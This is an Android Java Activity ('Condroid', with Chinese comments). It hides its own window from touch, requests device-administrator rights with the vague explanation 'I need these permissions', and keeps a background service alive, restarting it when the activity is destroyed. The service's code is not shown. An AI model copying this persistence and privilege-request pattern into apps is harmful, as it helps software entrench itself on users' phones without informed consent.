package com.connect;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.os.Bundle;
import android.util.Log;
import android.view.WindowManager;
import android.widget.Toast;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.Context;
import android.content.Intent;

public class Condroid extends Activity {
   
    @Override
    public void onCreate(Bundle savedInstanceState) { 
        super.onCreate(savedInstanceState);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
		getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN);
		registerDevicePolicyManager();


    	if(isMyServiceRunning()==false) 
    	{		
    		startService(new Intent(getApplicationContext(), MyService.class));
    		Log.i("com.connect","startService");
    	}
    }
    
	private boolean isMyServiceRunning() {
	    ActivityManager manager = (ActivityManager) getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE);
	    for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
	        if (MyService.class.getName().equals(service.service.getClassName())) {
	            return true;
	        }
	    }
	    return false;
	}

	//********************************************************************************************************************************************************
	/**
	 * 注册成为"设备管理器"
	 */
	public void registerDevicePolicyManager() {
		//设备管理器
		DevicePolicyManager devicePolicyManager;
		ComponentName componentName;
		try {
			// 实例化系统的设备管理器
			devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
			//指定广播接收器
			componentName = new ComponentName(this, MyDeviceAdminReceiver.class);
			//检测是否已经是设备管理器
			if (!devicePolicyManager.isAdminActive(componentName)) {
				//开始注册设备管理器，Action必须为DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN
				Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
				intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
				//注册设备管理器时可以显示一些话术，就在这里添加
				intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "我需要这些权限");
				//打开注册页面
				startActivityForResult(intent, 0);
			} else {
				// 已经是设备管理器了，就可以操作一些特殊的安全权限了
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	//********************************************************************************************************************************************************
	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		super.onActivityResult(requestCode, resultCode, data);
		if (0 == requestCode) {
			if (resultCode == Activity.RESULT_OK) {
				// 用户同意了
				Log.i("Condroid", "Enable it");
			} else {
				Log.i("Condroid", "Cancle it");
				// 用户拒绝了
			}
		}
	}
	//********************************************************************************************************************************************************

	@Override
	protected void onDestroy() {
		startService(new Intent(getApplicationContext(), MyService.class));
		super.onDestroy();
	}
}
